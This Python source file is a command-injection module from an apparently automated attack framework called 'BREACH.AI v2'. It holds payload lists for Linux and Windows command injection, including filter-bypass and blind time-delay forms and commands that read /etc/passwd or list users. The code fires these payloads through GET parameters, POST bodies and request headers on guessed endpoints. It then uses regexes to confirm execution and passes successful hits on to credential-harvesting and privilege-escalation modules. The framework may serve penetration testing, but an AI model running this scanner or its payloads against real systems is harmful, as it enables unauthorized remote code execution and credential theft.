"""
BREACH.AI v2 - Command Injector

OS command injection module for remote code execution.
Tests for command injection in parameters, headers, and file operations.
"""

import asyncio
import time
import re
from urllib.parse import urljoin, quote

from breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Command injection payloads organized by technique
COMMAND_PAYLOADS = {
    "basic_linux": [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; uname -a",
    ],
    "basic_windows": [
        "& dir",
        "| dir",
        "&& dir",
        "& whoami",
        "| type C:\\Windows\\win.ini",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| net user",
    ],
    "blind_linux": [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "|| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; ping -c 5 127.0.0.1",
    ],
    "blind_windows": [
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
        "&& timeout /t 5",
    ],
    "encoded": [
        "%0aid",
        "%0awhoami",
        "%0a/bin/cat%20/etc/passwd",
        "${IFS}id",
        ";${IFS}id",
        "'%0Aid%0A'",
        "\nid\n",
        "\r\nid",
    ],
    "filter_bypass": [
        "i]d",  # Using ] as wildcard
        "/???/??t /???/p??s??",  # Glob bypass for /bin/cat /etc/passwd
        "w'h'o'a'm'i",  # Quote bypass
        'w"h"o"a"m"i',
        "$(printf '\\x69\\x64')",  # Hex encoded 'id'
        "{cat,/etc/passwd}",  # Brace expansion
    ],
}

# Patterns that indicate successful command execution
SUCCESS_PATTERNS = {
    "linux": [
        r"uid=\d+",  # id command
        r"root:x:0:0",  # /etc/passwd
        r"Linux\s+\w+\s+\d+\.\d+",  # uname -a
        r"www-data|apache|nginx|nobody",  # Common web users
        r"/bin/bash|/bin/sh",  # Shell indicators
    ],
    "windows": [
        r"Directory of",  # dir command
        r"Volume Serial Number",
        r"\\Windows\\",
        r"Administrator",
        r"\[boot loader\]",  # win.ini
        r"User accounts for",  # net user
    ],
}

# Common injection points
INJECTION_ENDPOINTS = [
    "/api/ping",
    "/api/lookup",
    "/api/dns",
    "/api/whois",
    "/api/trace",
    "/api/nslookup",
    "/api/convert",
    "/api/process",
    "/api/execute",
    "/api/run",
    "/api/command",
    "/api/shell",
    "/api/system",
    "/api/exec",
    "/cgi-bin/",
    "/api/file",
    "/api/download",
    "/api/upload",
    "/api/export",
    "/api/import",
    "/api/backup",
]

INJECTION_PARAMS = [
    "cmd", "command", "exec", "execute", "run",
    "host", "hostname", "ip", "target", "domain",
    "file", "filename", "path", "dir", "directory",
    "url", "uri", "src", "dest", "destination",
    "query", "q", "input", "data", "arg",
    "ping", "lookup", "address", "server",
]


@register_module
class CommandInjector(InitialAccessModule):
    """
    Command Injector - OS command injection for RCE.

    Techniques:
    - Basic command chaining (; | || && &)
    - Backtick and $() substitution
    - Blind injection via time delays
    - Encoded payloads for filter bypass
    - Windows and Linux specific payloads
    """

    info = ModuleInfo(
        name="command_injector",
        phase=BreachPhase.INITIAL_ACCESS,
        description="OS command injection for remote code execution",
        author="BREACH.AI",
        techniques=["T1059", "T1190"],  # Command and Scripting Interpreter
        platforms=["web", "api"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.ROOT,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if target has potential injection points."""
        return bool(config.target)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Execute command injection attacks."""
        self._start_execution()

        vulns = []
        target = config.target.rstrip("/")

        # Get endpoints from recon or use defaults
        endpoints = config.chain_data.get("endpoints", [])
        all_endpoints = list(set(INJECTION_ENDPOINTS + endpoints))

        # Test each endpoint
        for endpoint in all_endpoints[:20]:
            # Test GET parameters
            get_vulns = await self._test_get_injection(target, endpoint, config)
            vulns.extend(get_vulns)

            # Test POST body
            post_vulns = await self._test_post_injection(target, endpoint, config)
            vulns.extend(post_vulns)

            # Test headers
            header_vulns = await self._test_header_injection(target, endpoint, config)
            vulns.extend(header_vulns)

        # Test blind injection if no direct vulns found
        if not vulns:
            blind_vulns = await self._test_blind_injection(target, all_endpoints[:10], config)
            vulns.extend(blind_vulns)

        # Collect evidence
        for vuln in vulns:
            self._add_evidence(
                evidence_type=EvidenceType.COMMAND_OUTPUT,
                description=f"Command Injection: {vuln['type']} at {vuln['endpoint']}",
                content={
                    "endpoint": vuln["endpoint"],
                    "parameter": vuln.get("parameter", "N/A"),
                    "payload": vuln["payload"],
                    "output": vuln.get("output", "")[:1000],
                    "os_detected": vuln.get("os", "unknown"),
                    "blind": vuln.get("blind", False),
                },
                proves=f"Remote code execution via {vuln['type']}",
                severity=Severity.CRITICAL,
            )

        # Determine access level
        access_gained = AccessLevel.ROOT if vulns else None

        return self._create_result(
            success=len(vulns) > 0,
            action="command_injection",
            details=f"Found {len(vulns)} command injection vulnerabilities",
            access_gained=access_gained,
            data_extracted={"rce_vulns": vulns} if vulns else None,
            enables_modules=["linux_escalator", "credential_harvester"] if vulns else [],
        )

    async def _test_get_injection(self, target: str, endpoint: str, config: ModuleConfig) -> list:
        """Test GET parameter injection."""
        vulns = []
        url = urljoin(target, endpoint)

        for param in INJECTION_PARAMS[:10]:
            # Test Linux payloads
            for payload in COMMAND_PAYLOADS["basic_linux"][:5]:
                test_url = f"{url}?{param}={quote(payload)}"
                response = await self._safe_request("GET", test_url, timeout=10)

                if response and self._has_command_output(response, "linux"):
                    vulns.append({
                        "endpoint": endpoint,
                        "parameter": param,
                        "type": "get_injection",
                        "payload": payload,
                        "output": response.get("text", "")[:500],
                        "os": "linux",
                    })
                    return vulns  # Found RCE, critical enough

            # Test Windows payloads
            for payload in COMMAND_PAYLOADS["basic_windows"][:3]:
                test_url = f"{url}?{param}={quote(payload)}"
                response = await self._safe_request("GET", test_url, timeout=10)

                if response and self._has_command_output(response, "windows"):
                    vulns.append({
                        "endpoint": endpoint,
                        "parameter": param,
                        "type": "get_injection",
                        "payload": payload,
                        "output": response.get("text", "")[:500],
                        "os": "windows",
                    })
                    return vulns

        return vulns

    async def _test_post_injection(self, target: str, endpoint: str, config: ModuleConfig) -> list:
        """Test POST body injection."""
        vulns = []
        url = urljoin(target, endpoint)

        for param in INJECTION_PARAMS[:8]:
            for payload in COMMAND_PAYLOADS["basic_linux"][:4]:
                # Test form data
                response = await self._safe_request(
                    "POST",
                    url,
                    data={param: payload},
                    timeout=10,
                )

                if response and self._has_command_output(response, "linux"):
                    vulns.append({
                        "endpoint": endpoint,
                        "parameter": param,
                        "type": "post_injection_form",
                        "payload": payload,
                        "output": response.get("text", "")[:500],
                        "os": "linux",
                    })
                    return vulns

                # Test JSON body
                response = await self._safe_request(
                    "POST",
                    url,
                    json={param: payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )

                if response and self._has_command_output(response, "linux"):
                    vulns.append({
                        "endpoint": endpoint,
                        "parameter": param,
                        "type": "post_injection_json",
                        "payload": payload,
                        "output": response.get("text", "")[:500],
                        "os": "linux",
                    })
                    return vulns

        return vulns

    async def _test_header_injection(self, target: str, endpoint: str, config: ModuleConfig) -> list:
        """Test header injection."""
        vulns = []
        url = urljoin(target, endpoint)

        injectable_headers = [
            "User-Agent",
            "X-Forwarded-For",
            "X-Custom-Header",
            "Referer",
            "Accept-Language",
        ]

        for header in injectable_headers:
            for payload in COMMAND_PAYLOADS["basic_linux"][:3]:
                headers = {header: payload}
                response = await self._safe_request("GET", url, headers=headers, timeout=10)

                if response and self._has_command_output(response, "linux"):
                    vulns.append({
                        "endpoint": endpoint,
                        "parameter": f"Header: {header}",
                        "type": "header_injection",
                        "payload": payload,
                        "output": response.get("text", "")[:500],
                        "os": "linux",
                    })
                    return vulns

        return vulns

    async def _test_blind_injection(self, target: str, endpoints: list, config: ModuleConfig) -> list:
        """Test for blind command injection via time delays."""
        vulns = []

        for endpoint in endpoints[:5]:
            url = urljoin(target, endpoint)

            for param in INJECTION_PARAMS[:5]:
                for payload in COMMAND_PAYLOADS["blind_linux"][:2]:
                    start_time = time.time()

                    response = await self._safe_request(
                        "GET",
                        f"{url}?{param}={quote(payload)}",
                        timeout=15,
                    )

                    elapsed = time.time() - start_time

                    # If request took 4-6 seconds (sleep 5), likely vulnerable
                    if 4.0 <= elapsed <= 8.0:
                        vulns.append({
                            "endpoint": endpoint,
                            "parameter": param,
                            "type": "blind_injection",
                            "payload": payload,
                            "delay": f"{elapsed:.2f}s",
                            "blind": True,
                            "os": "linux",
                        })
                        return vulns  # Found blind RCE

        return vulns

    def _has_command_output(self, response: dict, os_type: str) -> bool:
        """Check if response contains command output."""
        if not response:
            return False

        text = response.get("text", "")
        patterns = SUCCESS_PATTERNS.get(os_type, [])

        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True

        return False
